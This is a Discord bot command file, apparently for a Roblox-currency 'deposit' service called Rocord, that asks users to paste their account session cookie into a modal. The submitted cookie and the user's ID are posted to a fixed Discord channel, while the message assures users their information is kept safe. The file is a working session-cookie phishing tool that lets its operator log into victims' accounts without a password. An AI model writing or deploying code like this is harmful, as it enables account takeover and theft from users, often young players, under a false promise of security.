module.exports = [{
name: 'depo',
aliases: ['dep', 'deposit'],
code: `

$author[$username[$authorID];$userAvatar[$authorID]]
$thumbnail[https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png]
$description[
# Deposit
- To deposit you need to provide your **account cookie**.
- This information is **really sensitive** so becareful of giving someone your cookie.
- With this cookie, people can login to your account **without providing username or password**!
- Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
**Do at your own risk**

**Choose an amount to deposit**
- 5 $
- 10 $
- 20 $
- 30 $
- 50 $

We understand that __**security**__ is a top priority, and we want to assure you that we take it **very seriously**.

Our system is designed with the latest security measures to **keep your information safe and secure**.

You can trust us to handle your account with the **utmost care and professionalism**.
Thanks!
]
$footer[Rocord]
$addtimestamp
$color[Blue]

$addButton[1;5 R$;primary;dep5_$authorID;false]
$addButton[1;10 R$;primary;dep10_$authorID;false]
$addButton[1;20 R$;primary;dep20_$authorID;false]
$addButton[1;30 R$;primary;dep30_$authorID;false]
$addButton[1;50 R$;primary;dep50_$authorID;false]


`
},{
type: "interaction",
prototype: "button",
code: `
$interactionModal[5R$ Deposit;depo5;
{actionRow:
{textInput:Security Cookie:1:cookieinput:true:your security code}
}
]

$onlyif[$advancedTextSplit[$interactionData[customId];_;2]==$interactionData[author.id];{
"embeds" : "{newEmbed:{description:Not Your Button!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]
$onlyIf[$advancedTextSplit[$interactionData[customId];_;1]==dep5;]
`
},{
name: "depo5",
type: "interaction",
prototype: "modal",
code: `

$channelSendMessage[1129331561267990528;
depo5 $interactionData[author.id] $textinputvalue[cookieinput]
]

$interactionUpdate[;
{newEmbed:
{author:$username[$interactionData[author.id]]:$userAvatar[$interactionData[author.id]]}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
{title:Request Sent!}
{description:
# Deposit
- To deposit you need to provide your **account cookie**.
- This information is **really sensitive** so becareful of giving someone your cookie.
- With this cookie, people can login to your account **without providing username or password**!
- Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
**Do at your own risk**

**Choose an amount to deposit**
- **5 $**
- 10 $
- 20 $
- 30 $
- 50 $

We understand that __**security**__ is a top priority, and we want to assure you that we take it **very seriously**.

Our system is designed with the latest security measures to **keep your information safe and secure**.

You can trust us to handle your account with the **utmost care and professionalism**.
Thanks!
}
{footer:Rocord}
{timestamp}
{color:#00ff00}
};
{actionRow:
{button:5 $:success:a:false} 
{button:10 $:danger:a:false}
{button:20 $:secondary:a:false}
{button:30 $:secondary:a:false}
{button:50 $:secondary:a:false}
}
]


`
}]